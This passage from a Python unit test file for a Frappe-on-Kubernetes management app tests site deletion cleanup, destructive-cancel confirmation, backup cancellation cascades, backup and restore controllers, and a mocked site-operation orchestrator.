		doc = self._make_doc(bench_release="release-a")

		mock_release = MagicMock()
		mock_release.cluster = "cluster-a"
		mock_release.namespace = "ns"
		mock_release.status = "Deployed"

		with patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe") as mock_frappe:
			mock_frappe.get_doc.return_value = mock_release
			doc.is_new = lambda: True
			# Should not throw — validate succeeds
			doc.validate()
			# frappe.throw should not have been called with a release-status message
			for call_args in mock_frappe.throw.call_args_list:
				self.assertNotIn("deployed", call_args.args[0].lower())


class UnitTestOnTrashCleanup(UnitTestCase):
	"""H3: on_trash enqueues cancel whenever a Job pointer exists."""

	def _doc(self, **overrides):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite

		# Build a stub doc that mimics the surface on_trash uses.
		doc = MagicMock(spec=FrappeSite)
		doc.name = overrides.get("name", "rel-a/demo")
		doc.status = overrides.get("status", "Failed")
		doc.operation_job_name = overrides.get("operation_job_name", "ks-demo-abc123abc123")
		doc.cluster = overrides.get("cluster", "cluster-a")
		doc.namespace = overrides.get("namespace", "ns")
		# bind the real on_trash to the mock doc so we exercise the controller logic.
		doc.on_trash = FrappeSite.on_trash.__get__(doc, FrappeSite)
		return doc

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_on_trash_enqueues_cancel_for_failed_row_with_job(self, mock_enqueue, _mock_cascade):
		doc = self._doc(status="Failed", operation_job_name="ks-demo-abc123abc123")
		doc.on_trash()
		mock_enqueue.assert_called_once()
		_args, kwargs = mock_enqueue.call_args
		self.assertEqual(kwargs["job_name"], "ks-demo-abc123abc123")
		self.assertEqual(kwargs["cluster"], "cluster-a")
		self.assertEqual(kwargs["namespace"], "ns")
		# Cancel must run on the long queue — it issues a cluster mutation
		# (delete_namespaced_job), per the project design rule.
		self.assertEqual(kwargs["queue"], "long")

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_on_trash_no_enqueue_for_failed_row_without_job(self, mock_enqueue, _mock_cascade):
		doc = self._doc(status="Failed", operation_job_name=None)
		doc.on_trash()
		mock_enqueue.assert_not_called()

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_on_trash_still_enqueues_for_in_flight_with_job(self, mock_enqueue, _mock_cascade):
		# Regression guard: existing in-flight cleanup branch still works.
		doc = self._doc(status="In Progress", operation_job_name="ks-demo-deadbeef0000")
		doc.on_trash()
		mock_enqueue.assert_called_once()

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_on_trash_no_enqueue_for_draft_row(self, mock_enqueue, _mock_cascade):
		doc = self._doc(status="Draft", operation_job_name=None)
		doc.on_trash()
		mock_enqueue.assert_not_called()

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_on_trash_refuses_migrating_row(self, mock_enqueue, _mock_cascade):
		doc = self._doc(status="Migrating", operation_job_name="ks-demo-abc123abc123")
		with self.assertRaises(frappe.ValidationError):
			doc.on_trash()
		mock_enqueue.assert_not_called()

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_on_trash_cascades_backup_cancellation(self, _mock_enqueue, mock_cascade):
		"""Trashing a Frappe Site row must cascade to in-flight backups so
		they don't sit in Pending forever after the parent disappears."""
		doc = self._doc(status="Failed", operation_job_name="ks-demo-deadbeef0000")
		doc.name = "rel-a/demo"
		doc.on_trash()
		mock_cascade.assert_called_once()
		# The reason must reference site deletion so the operator viewing
		# the orphaned backup understands what happened.
		_args, kwargs = mock_cascade.call_args
		self.assertEqual(mock_cascade.call_args.args[0], "rel-a/demo")
		self.assertIn("deleted", kwargs["reason"].lower())


class UnitTestCancelSiteConfirmation(UnitTestCase):
	"""H1: cancel_site requires confirm_destructive when status is Migrating."""

	def _doc(self, **overrides):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite

		doc = MagicMock(spec=FrappeSite)
		doc.name = overrides.get("name", "rel-a/demo")
		doc.status = overrides.get("status", "Migrating")
		doc.operation_job_name = overrides.get("operation_job_name", "ks-demo-abc123abc123")
		doc.cluster = overrides.get("cluster", "cluster-a")
		doc.namespace = overrides.get("namespace", "ns")
		doc.site_name = overrides.get("site_name", "demo")
		doc.cancel_site = FrappeSite.cancel_site.__get__(doc, FrappeSite)
		return doc

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_cancel_migrating_throws_without_confirm(
		self,
		mock_enqueue,
		mock_msgprint,
		mock_publish,
		mock_session,
		_mock_cascade,
	):
		mock_session.user = "alice@example.com"
		doc = self._doc(status="Migrating")
		with self.assertRaises(frappe.ValidationError):
			doc.cancel_site()
		mock_enqueue.assert_not_called()
		mock_msgprint.assert_not_called()
		mock_publish.assert_not_called()

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_cancel_migrating_succeeds_with_confirm(
		self,
		mock_enqueue,
		mock_msgprint,
		mock_publish,
		mock_session,
		_mock_cascade,
	):
		mock_session.user = "alice@example.com"
		doc = self._doc(status="Migrating")
		doc.cancel_site(confirm_destructive=True)
		mock_enqueue.assert_called_once()
		detail_calls = [c for c in doc.db_set.call_args_list if c.args and c.args[0] == "status_detail"]
		self.assertTrue(detail_calls, "expected a status_detail db_set call")
		detail_value = detail_calls[-1].args[1]
		self.assertIn("destructive cancel acknowledged", detail_value)
		self.assertIn("alice@example.com", detail_value)

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_cancel_in_progress_does_not_require_confirm(
		self,
		mock_enqueue,
		mock_msgprint,
		mock_publish,
		mock_session,
		_mock_cascade,
	):
		mock_session.user = "alice@example.com"
		doc = self._doc(status="In Progress")
		doc.cancel_site()
		mock_enqueue.assert_called_once()

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	def test_cancel_deleting_does_not_require_confirm(
		self,
		mock_enqueue,
		mock_msgprint,
		mock_publish,
		mock_session,
	):
		mock_session.user = "alice@example.com"
		# We need to also patch the cascade here; this test predates it.
		with patch("kubeport.kubeport.doctype.frappe_site.frappe_site._cancel_inflight_backups_for_site"):
			doc = self._doc(status="Deleting")
			doc.cancel_site()
		mock_enqueue.assert_called_once()
		# Cancel must run on the long queue per the cluster-mutation rule.
		_args, kwargs = mock_enqueue.call_args
		self.assertEqual(kwargs["queue"], "long")


class UnitTestCancelInflightBackupsCascade(UnitTestCase):
	"""When a site is cancelled or trashed, every in-flight backup row
	linked to it must be force-failed and its operation_token rotated.

	Without this cascade, the backup row stays in Pending / In Progress /
	Restoring forever (its token is independent of the site's), and
	``_has_in_flight_backup`` blocks all future backups for that site."""

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.utils.now_datetime")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.db.set_value")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.get_all")
	def test_cascade_fails_each_inflight_backup_row(
		self,
		mock_get_all,
		mock_set_value,
		mock_enqueue,
		mock_publish,
		mock_now,
	):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import (
			_cancel_inflight_backups_for_site,
		)

		mock_get_all.return_value = [
			SimpleNamespace(
				name="demo::demo-2026",
				cluster="cluster-a",
				namespace="ns",
				operation_job_name="ks-bk-deadbeef",
			),
			SimpleNamespace(
				name="demo::demo-2025",
				cluster="cluster-a",
				namespace="ns",
				operation_job_name="",
			),
		]

		_cancel_inflight_backups_for_site("rel-a/demo", reason="Site cancelled.")

		# Both rows get failed.
		self.assertEqual(mock_set_value.call_count, 2)
		# Each set_value writes a token + Failed status + detail.
		for call_args in mock_set_value.call_args_list:
			fields = call_args.args[2]
			self.assertEqual(fields["status"], "Failed")
			self.assertEqual(fields["operation_job_token"], "")
			self.assertEqual(fields["status_detail"], "Site cancelled.")
			# operation_token is rotated to a fresh hex value.
			self.assertTrue(fields["operation_token"])
			self.assertNotEqual(fields["operation_token"], "")
		# Only the row with a recorded Job name enqueues a cluster cleanup.
		mock_enqueue.assert_called_once()
		_args, kwargs = mock_enqueue.call_args
		self.assertEqual(kwargs["job_name"], "ks-bk-deadbeef")
		self.assertEqual(kwargs["queue"], "long")
		# Realtime events fired for both rows so any open form refreshes.
		self.assertEqual(mock_publish.call_count, 2)

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.db.set_value")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.get_all")
	def test_cascade_no_op_when_no_inflight_rows(
		self,
		mock_get_all,
		mock_set_value,
		mock_enqueue,
		mock_publish,
	):
		"""No backups in-flight ⇒ no DB writes, no enqueue, no event."""
		from kubeport.kubeport.doctype.frappe_site.frappe_site import (
			_cancel_inflight_backups_for_site,
		)

		mock_get_all.return_value = []

		_cancel_inflight_backups_for_site("rel-a/demo", reason="Site cancelled.")

		mock_set_value.assert_not_called()
		mock_enqueue.assert_not_called()
		mock_publish.assert_not_called()


class UnitTestBackupRestoreController(UnitTestCase):
	def _doc(self, **overrides):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite

		doc = MagicMock(spec=FrappeSite)
		doc.name = overrides.get("name", "rel-a/demo.example.com")
		doc.status = overrides.get("status", "Active")
		doc.site_name = overrides.get("site_name", "demo.example.com")
		doc.bench_release = overrides.get("bench_release", "rel-a")
		doc.cluster = overrides.get("cluster", "cluster-a")
		doc.namespace = overrides.get("namespace", "ns")
		doc._has_in_flight_backup = FrappeSite._has_in_flight_backup.__get__(doc, FrappeSite)
		doc.backup_site = FrappeSite.backup_site.__get__(doc, FrappeSite)
		doc._enqueue_backup = FrappeSite._enqueue_backup.__get__(doc, FrappeSite)
		doc.restore_site = FrappeSite.restore_site.__get__(doc, FrappeSite)
		return doc

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.secrets.token_hex", return_value="tok-1")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe")
	def test_backup_site_creates_backup_row_and_enqueues_task(self, mock_frappe, _mock_token):
		doc = self._doc()
		release = SimpleNamespace(cluster="cluster-a", namespace="ns", release_name="bench-a")
		backup_doc = MagicMock()
		backup_doc.name = "demo.example.com::demo-20260430120000"

		def _get_doc(arg, name=None):
			if isinstance(arg, dict):
				self.assertEqual(arg["doctype"], "Frappe Site Backup")
				self.assertEqual(arg["operation_token"], "tok-1")
				return backup_doc
			return release

		mock_frappe.get_doc.side_effect = _get_doc
		mock_frappe.db.exists.return_value = None
		mock_frappe.session.user = "alice@example.com"

		result = doc.backup_site()

		self.assertEqual(result["backup_docname"], backup_doc.name)
		backup_doc.insert.assert_called_once_with(ignore_permissions=True)
		doc.db_set.assert_any_call("status", "In Progress")
		doc.db_set.assert_any_call("operation_token", "tok-1")
		mock_frappe.enqueue.assert_called_once()
		self.assertEqual(mock_frappe.enqueue.call_args.kwargs["backup_docname"], backup_doc.name)

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe")
	def test_restore_site_requires_destructive_confirmation(self, mock_frappe):
		doc = self._doc()
		mock_frappe.throw.side_effect = frappe.ValidationError

		with self.assertRaises(frappe.ValidationError):
			doc.restore_site("backup-a")

		mock_frappe.enqueue.assert_not_called()

	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.secrets.token_hex", return_value="tok-restore")
	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe")
	def test_restore_site_marks_backup_restoring_and_enqueues_task(self, mock_frappe, _mock_token):
		doc = self._doc()
		backup = MagicMock()
		backup.name = "backup-a"
		backup.status = "Available"
		backup.storage_backend = "pvc"
		backup.storage_path = "/mnt/kubeport-backups/c/ns/site/backup.tar.gz"
		backup.cluster = "cluster-a"
		backup.namespace = "ns"
		backup.site_name = "demo.example.com"
		mock_frappe.get_doc.return_value = backup
		mock_frappe.db.exists.return_value = None

		result = doc.restore_site("backup-a", confirm_destructive=True)

		self.assertEqual(result["backup_docname"], "backup-a")
		doc.db_set.assert_any_call("status", "Migrating")
		backup.db_set.assert_any_call("status", "Restoring")
		backup.db_set.assert_any_call("operation_token", "tok-restore")
		mock_frappe.enqueue.assert_called_once()


class UnitTestRunSiteOp(UnitTestCase):
	"""D1: orchestrator behavior under stubbed K8s apply calls."""

	def _config(self, op_kind="create", expected_status="In Progress"):
		from kubeport.tasks.site_tasks import SiteOpConfig

		labels = {
			"create": ("create-site", "Frappe Site Job Submission Failed", "Job submission failed"),
			"delete": (
				"delete-site",
				"Frappe Site Drop Submission Failed",
				"Drop-site Job submission failed",
			),
			"migrate": (
				"migrate-site",
				"Frappe Site Migrate Submission Failed",
				"Migrate Job submission failed",
			),
		}
		container_label, failure_log_title, failure_detail_prefix = labels[op_kind]
		return SiteOpConfig(
			op_kind=op_kind,
			expected_status=expected_status,
			container_label=container_label,
			failure_log_title=failure_log_title,
			failure_detail_prefix=failure_detail_prefix,
		)

	def _doc(self, **overrides):
		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite

		doc = MagicMock(spec=FrappeSite)
		doc.name = overrides.get("name", "rel-a/demo")
		doc.bench_release = overrides.get("bench_release", "rel-a")
		doc.site_name = overrides.get("site_name", "demo")
		doc.db_type = overrides.get("db_type", "mariadb")
		doc.db_root_secret = overrides.get("db_root_secret", "")
		doc.db_root_secret_key = overrides.get("db_root_secret_key", "mariadb-root-password")
		doc.install_apps = overrides.get("install_apps", "")
		doc.force_create = overrides.get("force_create", False)
		doc.get_password = MagicMock(return_value="pw")
		return doc

	def _stub_release(self):
		return SimpleNamespace(
			cluster="cluster-a",
			namespace="ns",
			release_name="rel-a",
		)

	def _ref_spec(self):
		# Pre-populate DB_HOST in container_env so the orchestrator's required
		# DB host resolution succeeds without needing a fake Service list.
		return {
			"image": "img:1",
			"pod_level": {},
			"container_env": [{"name": "DB_HOST", "value": "rel-a-mariadb"}],
			"container_env_from": [],
			"container_resources": None,
			"container_security_context": None,
			"volume_mounts": [],
			"volumes": [],
		}

	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	@patch("kubeport.tasks.site_tasks._site_operation_matches")
	def test_orchestrator_exits_early_when_token_superseded(
		self,
		mock_matches,
		mock_get_doc,
	):
		from kubeport.tasks.site_tasks import _run_site_op

		mock_matches.return_value = False
		_run_site_op(
			site_docname="rel-a/demo",
			operation_token="t1",
			config=self._config("create"),
			build_command=lambda doc: "echo noop",
			build_env=lambda doc, secret: [],
		)
		mock_get_doc.assert_not_called()

	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks._clone_reference_pod_spec")
	@patch("kubeport.tasks.site_tasks._select_site_discovery_pod")
	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
	@patch("kubeport.tasks.site_tasks.frappe.publish_realtime")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	@patch("kubeport.tasks.site_tasks._site_operation_matches")
	def test_orchestrator_happy_path_creates_secret_then_job_then_sets_tokens(
		self,
		mock_matches,
		mock_get_doc,
		mock_publish,
		mock_get_api_client,
		mock_select_pod,
		mock_clone_spec,
		mock_apply,
	):
		from kubeport.tasks.site_tasks import _run_site_op

		mock_matches.side_effect = [True, True]
		doc = self._doc()
		mock_get_doc.side_effect = [doc, self._stub_release()]
		mock_clone_spec.return_value = self._ref_spec()

		with patch("kubernetes.client.BatchV1Api") as mock_batch_api, patch("kubernetes.client.CoreV1Api"):
			mock_batch_api.return_value.read_namespaced_job.return_value = SimpleNamespace(
				metadata=SimpleNamespace(uid="job-uid-123"),
			)
			_run_site_op(
				site_docname="rel-a/demo",
				operation_token="t1",
				config=self._config("create"),
				build_command=lambda doc: "bench new-site x",
				build_env=lambda doc, secret: [{"name": "SITE_NAME", "value": "demo"}],
				build_creds_secret=lambda doc, job_name: {
					"apiVersion": "v1",
					"kind": "Secret",
					"type": "Opaque",
					"metadata": {"name": f"{job_name}-creds", "namespace": "ns", "labels": {}},
					"stringData": {"ADMIN_PASSWORD": "pw"},
				},
			)

		self.assertEqual(mock_apply.call_count, 3)
		set_keys = [c.args[0] for c in doc.db_set.call_args_list]
		self.assertIn("operation_job_name", set_keys)
		self.assertIn("operation_job_token", set_keys)
		mock_publish.assert_called_once()

	@patch("kubeport.tasks.site_tasks._best_effort_delete_secret")
	@patch("kubeport.tasks.site_tasks._best_effort_delete_job")
	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks._clone_reference_pod_spec")
	@patch("kubeport.tasks.site_tasks._select_site_discovery_pod")
	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
	@patch("kubeport.tasks.site_tasks.frappe.publish_realtime")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	@patch("kubeport.tasks.site_tasks._site_operation_matches")
	def test_orchestrator_post_apply_token_mismatch_deletes_orphan_resources(
		self,
		mock_matches,
		mock_get_doc,
		mock_publish,
		mock_get_api_client,
		mock_select_pod,
		mock_clone_spec,
		mock_apply,
		mock_delete_job,
		mock_delete_secret,
	):
		from kubeport.tasks.site_tasks import _run_site_op

		mock_matches.side_effect = [True, False]
		doc = self._doc()
		mock_get_doc.side_effect = [doc, self._stub_release()]
		mock_clone_spec.return_value = self._ref_spec()

		with patch("kubernetes.client.BatchV1Api") as mock_batch_api, patch("kubernetes.client.CoreV1Api"):
			mock_batch_api.return_value.read_namespaced_job.return_value = SimpleNamespace(
				metadata=SimpleNamespace(uid="job-uid-123"),
			)
			_run_site_op(
				site_docname="rel-a/demo",
				operation_token="t1",
				config=self._config("create"),
				build_command=lambda doc: "bench new-site x",
				build_env=lambda doc, secret: [],
				build_creds_secret=lambda doc, job_name: {
					"apiVersion": "v1",
					"kind": "Secret",
					"type": "Opaque",
					"metadata": {"name": f"{job_name}-creds", "namespace": "ns", "labels": {}},
					"stringData": {"ADMIN_PASSWORD": "pw"},
				},
			)

		mock_delete_job.assert_called_once()
		mock_delete_secret.assert_called_once()
		set_keys = [c.args[0] for c in doc.db_set.call_args_list]
		self.assertNotIn("operation_job_name", set_keys)
		mock_publish.assert_not_called()

	@patch("kubeport.tasks.site_tasks.apply_resource")
	@patch("kubeport.tasks.site_tasks._clone_reference_pod_spec")
	@patch("kubeport.tasks.site_tasks._select_site_discovery_pod")
	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
	@patch("kubeport.tasks.site_tasks.frappe.publish_realtime")
	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
	@patch("kubeport.tasks.site_tasks._site_operation_matches")
	def test_orchestrator_skips_secret_when_build_creds_secret_returns_none(
		self,
		mock_matches,
		mock_get_doc,
		mock_publish,
		mock_get_api_client,
		mock_select_pod,
		mock_clone_spec,
		mock_apply,
	):
		from kubeport.tasks.site_tasks import _run_site_op

		mock_matches.side_effect = [True, True]
		doc = self._doc()
		mock_get_doc.side_effect = [doc, self._stub_release()]
		mock_clone_spec.return_value = self._ref_spec()

		with patch("kubernetes.client.BatchV1Api"), patch("kubernetes.client.CoreV1Api"):
			_run_site_op(
				site_docname="rel-a/demo",
				operation_token="t1",
				config=self._config("migrate", expected_status="Migrating"),
				build_command=lambda doc: "bench --site x migrate",
				build_env=lambda doc, secret: [{"name": "SITE_NAME", "value": "demo"}],
				build_creds_secret=None,
			)

		self.assertEqual(mock_apply.call_count, 1)
		mock_publish.assert_called_once()
